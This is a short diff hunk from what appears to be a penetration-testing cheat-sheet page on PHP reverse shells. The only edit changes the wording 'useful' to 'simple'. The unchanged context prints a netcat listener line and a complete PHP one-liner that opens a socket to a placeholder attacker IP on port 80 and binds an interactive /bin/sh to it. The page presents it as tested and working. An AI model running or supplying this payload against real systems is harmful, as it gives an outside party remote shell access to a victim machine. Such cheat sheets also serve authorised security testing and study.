@@ -62,7 +62,7 @@ nc: listening on 0.0.0.0 80 ...
 
 The following section contains PHP reverse shells that have been tested working. 
 
-A useful PHP reverse shell:
+A simple PHP reverse shell:
 
 {% highlight bash %}
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
